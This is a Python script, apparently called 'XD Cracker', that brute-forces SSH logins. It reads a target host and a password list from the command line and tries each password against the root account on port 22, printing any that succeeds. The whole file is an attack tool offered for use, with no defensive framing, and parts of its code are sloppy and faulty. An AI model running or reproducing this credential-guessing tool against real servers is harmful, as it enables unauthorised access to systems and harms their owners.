from paramiko import SSHClient , AutoAddPolicy
from os import system , name
from colorama import Fore , init
from pystyle import Colorate , Colors
from threading import Thread as thr
from sys import argv
from socket import socket

init()
system('cls' if name == 'nt' else 'clear')

red = Fore.LIGHTRED_EX; green = Fore.LIGHTGREEN_EX; blue = Fore.LIGHTBLUE_EX; yellow = Fore.LIGHTYELLOW_EX; cyan = Fore.LIGHTCYAN_EX; white = Fore.LIGHTWHITE_EX; magenta = Fore.LIGHTMAGENTA_EX;

stop = 0
port = 22

banner = '''
        ▒██   ██▒▓█████▄     ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███  
        ▒▒ █ █ ▒░▒██▀ ██▌   ▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
        ░░  █   ░░██   █▌   ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
        ░ █ █ ▒ ░▓█▄   ▌   ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
        ▒██▒ ▒██▒░▒████▓    ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
        ▒▒ ░ ░▓ ░ ▒▒▓  ▒    ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
        ░░   ░▒ ░ ░ ▒  ▒      ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
        ░    ░   ░ ░  ░    ░          ░░   ░   ░   ▒   ░        ░ ░░ ░    ░     ░░   ░ 
        ░    ░     ░       ░ ░         ░           ░  ░░ ░      ░  ░      ░  ░   ░     
                ░         ░                           ░                               
'''

print(Colorate.Horizontal(Colors.green_to_yellow , banner , 1))
print(f'                                  {red}Created {cyan}By {yellow}John {blue}Wick {red}xD')

try:
    host = argv[1]
    passlistt = argv[2]
except:
    print(f'\n    {blue}main{red}.{blue}py {red}{yellow}<host{red}> <{yellow}passlist.txt{red}>')

file = open(passlistt , 'r')

def main():
    while True:
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        try:
            try:
                for passlist in file:      
                    ssh.connect(host , port=port , username='root' , password=passlist)
                    print(Colorate.Horizontal(Colors.green_to_cyan , f'Found With This Password {passlist} And User : root' , 2))
            except:
                print(Colorate.Horizontal(Colors.red_to_purple , f'Cant Find With This Password {passlist} And User : root' , 2))
        except socket.timeout:
            print(f'{red} Timed Out xD !!!')


thr(target=main).start()
